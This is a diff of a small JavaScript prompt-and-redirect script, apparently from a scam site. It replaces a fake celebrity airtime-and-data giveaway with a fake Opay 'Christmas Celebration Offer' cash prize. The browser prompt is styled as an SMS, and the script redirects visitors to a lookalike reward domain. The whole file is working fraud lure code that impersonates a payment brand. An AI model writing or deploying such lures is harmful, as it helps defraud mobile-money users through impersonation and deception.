@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '1'
-password=prompt('SMS: Congratulations You are among the 10,000 fans to receive R50 Airtime and 15GB Free Data From NASTY-c Birthday Offer, Kindly Press 1 to ACTIVATE ','1');
-if (password != '1') {
-location.href='https://nastyc.data-offer.xyz/15GB';
+var password = 'WITHDRAW ₦50,000'
+password=prompt('SMS: Congratulations Your Opay Number is Eligible to receive ₦50,000 Opay Christmas Celebration Offer, Kindly Press OK to Withdraw Cash Prize ','WITHDRAW ₦50,000');
+if (password != 'WITHDRAW ₦50,000') {
+location.href='https://opay-reward.claim-it.lat/offer';
 }
